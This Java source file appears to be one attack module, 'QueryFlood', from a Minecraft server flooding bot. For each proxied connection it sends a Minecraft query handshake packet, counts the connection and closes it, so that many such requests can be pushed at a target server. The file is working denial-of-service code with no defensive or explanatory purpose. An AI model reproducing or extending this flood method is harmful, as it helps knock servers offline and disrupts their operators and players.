package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;





public class QueryFlood
  implements Method
{
  public QueryFlood() {}
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.writeByte(254);
      out.writeByte(253);
      out.writeByte(9);
      out.writeByte(0);
      out.writeByte(0);
      out.writeByte(0);
      out.writeByte(1);
      out.close();
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    channel.close();
  }
}
